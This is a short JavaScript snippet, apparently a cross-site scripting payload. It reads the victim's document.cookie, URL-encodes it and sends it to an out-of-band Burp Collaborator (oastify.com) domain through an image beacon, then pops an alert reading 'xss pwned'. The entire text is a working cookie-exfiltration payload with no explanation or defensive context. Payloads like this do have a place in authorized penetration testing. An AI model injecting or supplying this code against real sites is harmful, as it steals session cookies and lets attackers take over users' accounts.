(function() {
    const collaboratorDomain = "s4x3nub3z8yq1dest54teeedm4svgn4c.oastify.com";
    
    const payload = encodeURIComponent(document.cookie);
    const exfilEndpoint = `http://${collaboratorDomain}?cookie=${payload}`;
    
    const beacon = new Image();
    beacon.src = exfilEndpoint;
})();


alert("xss pwned")
